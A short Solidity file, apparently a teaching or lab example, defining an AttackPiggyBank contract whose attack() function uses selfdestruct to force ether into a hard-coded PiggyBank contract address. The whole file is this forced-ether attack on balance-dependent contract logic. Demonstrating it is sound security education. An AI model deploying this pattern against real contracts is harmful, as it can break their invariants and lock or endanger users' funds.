// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.4;

import "./PiggyBank.sol";

contract AttackPiggyBank {
    address PiggyBankAddress = 0xf8e81D47203A594245E36C48e151709F0C19fBe8;
    
    function attack() public payable {
        selfdestruct(payable(PiggyBankAddress));
    }
    
    function getBalance() public view returns(uint) {
        return address(this).balance;
    }
     
    receive() external payable {}
}